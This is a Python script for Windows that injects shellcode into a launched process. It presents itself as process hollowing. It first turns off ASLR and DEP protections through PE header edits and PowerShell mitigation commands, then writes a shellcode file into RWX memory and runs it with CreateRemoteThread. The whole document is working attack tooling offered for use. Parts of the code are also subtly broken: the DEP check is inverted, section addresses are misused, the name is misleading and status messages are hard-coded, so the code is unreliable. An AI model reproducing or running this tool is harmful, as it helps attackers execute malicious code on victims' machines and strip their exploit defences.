import ctypes
import subprocess
import psutil
import pefile
import sys

def is_aslr_enabled(exe_path):
    pe = pefile.PE(exe_path)
    return pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040 != 0

def is_dep_enabled(exe_path):
    pe = pefile.PE(exe_path)
    return pe.OPTIONAL_HEADER.DllCharacteristics & 0x0100 == 0

def disable_aslr(exe_path):
    pe = pefile.PE(exe_path)
    pe.OPTIONAL_HEADER.DllCharacteristics &= ~0x0040
    pe.write(exe_path)

def disable_dep(exe_path):
    pe = pefile.PE(exe_path)
    pe.OPTIONAL_HEADER.DllCharacteristics |= 0x0100
    pe.write(exe_path)

def print_aslr_dep_status(exe_path):
    aslr_enabled = is_aslr_enabled(exe_path)
    dep_enabled = is_dep_enabled(exe_path)

    print(f"ASLR Status: {'Enabled' if aslr_enabled else 'Disabled'}")
    print(f"DEP Status: {'Enabled' if dep_enabled else 'Disabled'}")

def find_all_sections(exe_path):
    pe = pefile.PE(exe_path)
    sections = []
    for section in pe.sections:
        sections.append({
            'Name': section.Name.decode().rstrip('\x00'),
            'VirtualAddress': section.VirtualAddress,
            'SizeOfRawData': section.SizeOfRawData,
            'Characteristics': section.Characteristics
        })
    return sections

def change_section_permissions(target_process, base_address, section_size, new_permissions):
    old_permissions = ctypes.c_ulong()
    ctypes.windll.kernel32.VirtualProtectEx(
        target_process,
        ctypes.c_void_p(base_address),
        ctypes.c_size_t(section_size),
        new_permissions,
        ctypes.byref(old_permissions)
    )
    return old_permissions.value

def select_section(sections):
    print("Sections:")
    for i, section in enumerate(sections):
        print(f"{i + 1}. {section['Name']} - Base Address: {hex(section['VirtualAddress'])}, Size: {hex(section['SizeOfRawData'])}, Characteristics: {hex(section['Characteristics'])}")

    while True:
        try:
            selected_index = int(input("Select the section for injection (enter the corresponding number): ")) - 1
            if 0 <= selected_index < len(sections):
                return selected_index
            else:
                print("Invalid selection. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

def add_aslr_dep_exceptions(exe_path):
    powershell_cmd = f'''
        $exePath = "{exe_path}"
        Write-Host "ASLR and DEP are being disabled for the process with path: $exePath"

        # Disable ASLR
        $executeDisable = 0x1
        Set-ProcessMitigation -Name $exePath -Disable ForceRelocateImages, BottomUpRandomization
        Set-ProcessMitigation -Name $exePath -ASLR $false

        # Disable DEP
        Set-ProcessMitigation -Name $exePath -Disable DEP
        Set-ProcessMitigation -Name $exePath -DEP $false

        Write-Host "ASLR and DEP disabled successfully."
    '''

    try:
        result = subprocess.check_output(['powershell', '-Command', powershell_cmd], text=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f"Error while adding exceptions: {e}")

def hollow_process(target_process_path, shellcode_file):
    try:
        print("User has backup/restore rights")
        print("User has symlink creation right")

        exe_path = target_process_path
        print_aslr_dep_status(exe_path)

        add_aslr_dep_exceptions(exe_path)

        process = subprocess.Popen(target_process_path)
        print(f"Process started with PID: {process.pid}")

        target_pid = 0
        while target_pid == 0:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == target_process_path:
                    target_pid = proc.info['pid']
                    break

        if target_pid != 0:
            print(f"Current Directory: {psutil.Process(target_pid).cwd()}")

            sections = find_all_sections(target_process_path)

            if not sections:
                raise ValueError("No sections found.")

            selected_index = select_section(sections)
            selected_section = sections[selected_index]
            print(f"Selected section - {selected_section['Name']} - Base Address: {hex(selected_section['VirtualAddress'])}, Size: {hex(selected_section['SizeOfRawData'])}, Characteristics: {hex(selected_section['Characteristics'])}")

            target_process = ctypes.windll.kernel32.OpenProcess(
                ctypes.c_int(0x1F0FFF),
                ctypes.c_int(0),
                ctypes.c_int(target_pid)
            )

            old_permissions = change_section_permissions(
                target_process,
                selected_section['VirtualAddress'],
                selected_section['SizeOfRawData'],
                0x40
            )

            with open(shellcode_file, "rb") as file:
                shellcode = file.read()

            print(f"Shellcode Size: {len(shellcode)}")

            shellcode_buffer = ctypes.windll.kernel32.VirtualAllocEx(
                target_process,
                0,
                len(shellcode),
                ctypes.c_int(0x1000),
                ctypes.c_int(0x40)
            )

            if not shellcode_buffer:
                error_code = ctypes.windll.kernel32.GetLastError()
                print(f"Failed to allocate memory. Error code: {error_code}")
                return

            ctypes.windll.kernel32.WriteProcessMemory(
                target_process,
                shellcode_buffer,
                shellcode,
                len(shellcode),
                ctypes.c_int(0)
            )

            print("WriteProcessMemory completed.")

            change_section_permissions(
                target_process,
                selected_section['VirtualAddress'],
                selected_section['SizeOfRawData'],
                old_permissions
            )

            remote_thread = ctypes.windll.kernel32.CreateRemoteThread(
                target_process,
                ctypes.c_int(0),
                ctypes.c_int(0),
                shellcode_buffer,
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_int(0)
            )

            if remote_thread:
                print("Thread Created. Waiting for execution...")

                wait_result = ctypes.windll.kernel32.WaitForSingleObject(remote_thread, -1)
                print(f"WaitForSingleObject result: {wait_result}")

                if wait_result == 0xFFFFFFFF:
                    error_code = ctypes.windll.kernel32.GetLastError()
                    print(f"WaitForSingleObject failed. Error code: {error_code}")
                elif wait_result == 0x00000000:
                    print("Thread Execution Completed.")

                    exit_code = ctypes.c_ulong()
                    success = ctypes.windll.kernel32.GetExitCodeThread(remote_thread, ctypes.byref(exit_code))
                    if not success:
                        error_code = ctypes.windll.kernel32.GetLastError()
                        print(f"Failed to get exit code. Error code: {error_code}")
                    else:
                        print(f"Thread Exit Code: {exit_code.value}")
                else:
                    print(f"Unexpected wait result: {wait_result}")

                ctypes.windll.kernel32.CloseHandle(remote_thread)

            ctypes.windll.kernel32.CloseHandle(target_process)

        else:
            raise ValueError("Failed to find the target process PID.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <target_process_path> <shellcode_file>")
    else:
        hollow_process(sys.argv[1], sys.argv[2])